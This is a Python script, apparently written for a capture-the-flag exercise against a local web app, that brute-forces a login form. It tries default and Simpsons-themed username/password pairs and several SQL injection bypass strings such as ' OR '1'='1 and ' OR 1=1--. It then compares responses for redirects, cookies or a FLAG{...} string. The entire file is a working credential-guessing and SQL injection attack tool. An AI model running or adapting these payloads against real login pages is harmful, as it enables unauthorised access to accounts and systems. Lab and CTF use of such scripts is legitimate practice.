import requests
import re
from urllib.parse import urljoin

BASE_URL = "http://127.0.0.1:32888"
LOGIN_URL = urljoin(BASE_URL, "/index.php")

print("="*80)
print("LOGIN TESTING SCRIPT")
print("="*80)
print(f"\nTarget: {LOGIN_URL}\n")

# Test cases
test_cases = [
    # Common Simpsons credentials
    {"username": "homer", "password": "homer", "description": "homer/homer"},
    {"username": "homer", "password": "password", "description": "homer/password"},
    {"username": "homer", "password": "simpson", "description": "homer/simpson"},
    {"username": "marge", "password": "marge", "description": "marge/marge"},
    {"username": "marge", "password": "password", "description": "marge/password"},
    {"username": "bart", "password": "bart", "description": "bart/bart"},
    {"username": "bart", "password": "password", "description": "bart/password"},
    {"username": "lisa", "password": "lisa", "description": "lisa/lisa"},
    {"username": "admin", "password": "admin", "description": "admin/admin"},
    {"username": "admin", "password": "password", "description": "admin/password"},
    
    # SQL injection in password field
    {"username": "admin", "password": "' OR '1'='1", "description": "SQLi: ' OR '1'='1"},
    {"username": "admin", "password": "' OR 1=1--", "description": "SQLi: ' OR 1=1--"},
    {"username": "admin", "password": "') OR ('1'='1", "description": "SQLi: ') OR ('1'='1"},
    {"username": "admin", "password": "' OR '1'='1'--", "description": "SQLi: ' OR '1'='1'--"},
    {"username": "admin", "password": "' OR 1=1#", "description": "SQLi: ' OR 1=1#"},
    {"username": "admin", "password": "admin' OR '1'='1", "description": "SQLi: admin' OR '1'='1"},
    
    # Empty/NULL tests
    {"username": "", "password": "", "description": "Empty credentials"},
    {"username": "admin", "password": "", "description": "Empty password"},
    {"username": "", "password": "admin", "description": "Empty username"},
]

results = []
baseline_length = None
baseline_status = None

print("Starting authentication tests...\n")

for i, test in enumerate(test_cases, 1):
    try:
        # Prepare POST data
        data = {
            "username": test["username"],
            "password": test["password"]
        }
        
        # Send request
        response = requests.post(
            LOGIN_URL,
            data=data,
            allow_redirects=False,
            timeout=10
        )
        
        # Store baseline from first test
        if i == 1:
            baseline_status = response.status_code
            baseline_length = len(response.content)
        
        # Analyze response
        status = response.status_code
        length = len(response.content)
        has_redirect = 'Location' in response.headers
        redirect_url = response.headers.get('Location', '')
        
        # Check for interesting patterns
        response_text = response.text.lower()
        has_flag = bool(re.search(r'FLAG\{[^}]+\}', response.text, re.IGNORECASE))
        has_success_indicators = any(word in response_text for word in ['welcome', 'dashboard', 'logout', 'logged in', 'success'])
        has_error = any(word in response_text for word in ['error', 'invalid', 'failed', 'incorrect'])
        
        # Check for cookies
        has_session_cookie = bool(response.cookies)
        
        # Determine if this is anomalous
        is_anomalous = (
            status != baseline_status or
            abs(length - baseline_length) > 100 or  # Significant size difference
            has_redirect or
            has_flag or
            has_success_indicators or
            has_session_cookie
        )
        
        result = {
            'test': test['description'],
            'username': test['username'],
            'password': test['password'],
            'status': status,
            'length': length,
            'redirect': redirect_url if has_redirect else None,
            'cookies': dict(response.cookies) if has_session_cookie else None,
            'flag': bool(has_flag),
            'success_indicators': has_success_indicators,
            'error_indicators': has_error,
            'anomalous': is_anomalous,
            'response_preview': response.text[:500] if is_anomalous else None
        }
        
        results.append(result)
        
        # Print immediate results for anomalous responses
        if is_anomalous:
            print(f"\n[ANOMALY {i}] {test['description']}")
            print(f"  Username: '{test['username']}'")
            print(f"  Password: '{test['password']}'")
            print(f"  Status: {status} (baseline: {baseline_status})")
            print(f"  Length: {length}B (baseline: {baseline_length}B, diff: {length-baseline_length:+d}B)")
            if has_redirect:
                print(f"  Redirect: {redirect_url}")
            if has_session_cookie:
                print(f"  Cookies: {response.cookies}")
            if has_flag:
                print(f"  [!] FLAG DETECTED!")
                flag_match = re.search(r'FLAG\{[^}]+\}', response.text, re.IGNORECASE)
                if flag_match:
                    print(f"  [!] FLAG VALUE: {flag_match.group(0)}")
            if has_success_indicators:
                print(f"  [+] Success indicators found")
            print(f"\n  Response preview:\n{response.text[:1000]}")
            print(f"\n  Full response:\n{response.text}")
        else:
            # Print compact status for normal responses
            print(f"[{i:02d}] {test['description']}: Status={status}, Length={length}B {'(ERROR)' if has_error else ''}")
        
    except requests.exceptions.RequestException as e:
        print(f"[ERROR {i}] {test['description']}: {str(e)}")
        results.append({
            'test': test['description'],
            'error': str(e)
        })

# Summary
print("\n" + "="*80)
print("SUMMARY")
print("="*80)

anomalous_results = [r for r in results if r.get('anomalous', False)]

if anomalous_results:
    print(f"\nFound {len(anomalous_results)} anomalous response(s):\n")
    for r in anomalous_results:
        print(f"  • {r['test']}")
        print(f"    Status: {r['status']} | Length: {r['length']}B")
        if r.get('redirect'):
            print(f"    Redirect: {r['redirect']}")
        if r.get('cookies'):
            print(f"    Cookies: {r['cookies']}")
        if r.get('flag'):
            print(f"    [!] FLAG DETECTED")
        print()
else:
    print("\nNo anomalous responses detected. All tests returned similar results.")

print(f"\nBaseline: Status={baseline_status}, Length={baseline_length}B")
print(f"Total tests: {len(results)}")
print(f"Anomalous: {len(anomalous_results)}")
print(f"Errors: {len([r for r in results if 'error' in r])}")

